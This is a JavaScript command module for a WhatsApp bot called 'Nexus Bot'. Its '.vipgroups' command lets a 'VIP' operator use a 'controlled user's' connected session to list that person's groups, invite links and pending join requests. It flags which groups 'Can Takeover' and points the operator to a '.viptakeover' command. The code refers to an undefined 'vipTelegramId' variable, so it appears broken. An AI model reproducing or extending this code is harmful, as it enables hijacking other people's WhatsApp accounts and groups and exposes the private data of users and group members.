import { VIPQueries } from "../../database/query.js"
import { VIPHelper } from "../../whatsapp/index.js"

export default {
  name: "VIP Groups",
  description: "List all groups a controlled user is in",
  commands: ["vipgroups", "vipgrouplist"],
  category: "vipmenu",
  usage: "• `.vipgroups <phone>` - View user's groups",
  permissions: {
  ownerAndVip: true,
  privateOnly: true
},
  async execute(sock, sessionId, args, m) {
    try {
      // Parse target phone
      let targetPhone = null
      
      if (args.length > 0) {
        targetPhone = args[0].replace(/[@\s\-+]/g, '')
      }

      if (!targetPhone || !/^\d{10,15}$/.test(targetPhone)) {
        await sock.sendMessage(m.chat, { 
          text: "❌ Please provide a valid phone number.\n\nUsage: `.vipgroups 2347067023422`\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
        }, { quoted: m })
        return
      }

      // Convert phone to telegram ID
      const targetUser = await VIPQueries.getUserByPhone(targetPhone)
      
      if (!targetUser || !targetUser.telegram_id) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User with phone ${targetPhone} is not registered.\n\nThey need to connect first.

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
        }, { quoted: m })
        return
      }

      const targetTelegramId = targetUser.telegram_id

      // Check permission
      const canControl = await VIPHelper.canControl(vipTelegramId, targetTelegramId)
      if (!canControl.allowed) {
        const reasons = {
          'not_vip': 'You are not a VIP user',
          'target_is_vip': 'Cannot control other VIP users',
          'not_owned': 'You do not own this user'
        }
        await sock.sendMessage(m.chat, { 
          text: `❌ ${reasons[canControl.reason] || 'Permission denied'}

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
        }, { quoted: m })
        return
      }

      // Get target socket
      const targetSock = await VIPHelper.getUserSocket(targetTelegramId)
      if (!targetSock) {
        await sock.sendMessage(m.chat, { 
          text: `❌ User ${targetPhone} is not currently connected.

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
        }, { quoted: m })
        return
      }

      // Get user's groups
      await sock.sendMessage(m.chat, { 
        text: `🔍 Fetching groups for ${targetPhone}...\n\nPlease wait...

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
      }, { quoted: m })

      const groups = await VIPHelper.getUserGroups(targetSock)

      if (groups.length === 0) {
        await sock.sendMessage(m.chat, { 
          text: `📋 User ${targetPhone} is not in any groups.

` + `\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙` 
        }, { quoted: m })
        return
      }

      // Check pending requests for each group
const groupsWithPending = await Promise.all(
  groups.map(async (group) => {
    let pendingCount = 0
    try {
      const requests = await targetSock.groupRequestParticipantsList(group.jid)
      pendingCount = requests?.length || 0
    } catch (error) {
      // Ignore error - group might not have pending requests feature
    }
    
    return {
      ...group,
      pendingRequests: pendingCount
    }
  })
)

// Build groups list with links and pending requests
let response = `📋 *Groups for ${targetPhone}*\n\n`
response += `Total Groups: ${groupsWithPending.length}\n\n`

for (let i = 0; i < groupsWithPending.length; i++) {
  const group = groupsWithPending[i]
  const link = await VIPHelper.getGroupInviteLink(targetSock, group.jid)
  
  response += `${i + 1}️⃣ *${group.name}*\n`
  response += `   👥 Members: ${group.participants}\n`
  
  // Show takeover status
  if (group.isBotOwner) {
    response += `   👑 Owner (Can Takeover)\n`
  } else if (!group.hasOtherOwner) {
    response += `   🔓 Admin - No Owner (Can Takeover)\n`
  } else if (group.ownerIsBanned) {
    response += `   🔶 Admin - Owner Banned (Can Takeover)\n`
  } else {
    response += `   ⚠️ Admin - Has Active Owner (Cannot Takeover)\n`
  }
  
  // Show pending requests
  if (group.pendingRequests > 0) {
    response += `   📩 Pending Requests: ${group.pendingRequests}\n`
  }
  
  if (link) {
    response += `   🔗 ${link}\n`
  }
  response += `   🆔 \`${group.jid}\`\n\n`
}

response += `\n💡 *To Takeover:*\n`
response += `Reply to this message with:\n`
response += `\`.viptakeover <number>\`\n\n`
response += `Example: \`.viptakeover 1\``

const sentMsg = await sock.sendMessage(m.chat, { text: response }, { quoted: m })

// Store groups data (rest remains the same)
if (sentMsg && sentMsg.key && sentMsg.key.id) {
  global.vipGroupsCache = global.vipGroupsCache || new Map()
  
  const cacheKey = sentMsg.key.id
  console.log('[VIPGroups] Storing cache with key:', cacheKey)
  
  global.vipGroupsCache.set(cacheKey, {
    groups: groupsWithPending, // Store groups with pending info
    targetPhone,
    targetTelegramId,
    vipTelegramId,
    timestamp: Date.now()
  })
  
  console.log('[VIPGroups] Cache stored. Total cached items:', global.vipGroupsCache.size)

  setTimeout(() => {
    console.log('[VIPGroups] Cleaning up cache for key:', cacheKey)
    global.vipGroupsCache.delete(cacheKey)
  }, 600000)
}

      await VIPQueries.logActivity(vipTelegramId, 'view_groups', targetTelegramId, null, { 
        groupCount: groups.length 
      })

    } catch (error) {
      console.error("[VIPGroups] Error:", error)
      await sock.sendMessage(m.chat, { 
        text: "❌ Error fetching groups.\n\n> © 𝕹𝖊𝖝𝖚𝖘 𝕭𝖔𝖙" 
      }, { quoted: m })
    }
  }
}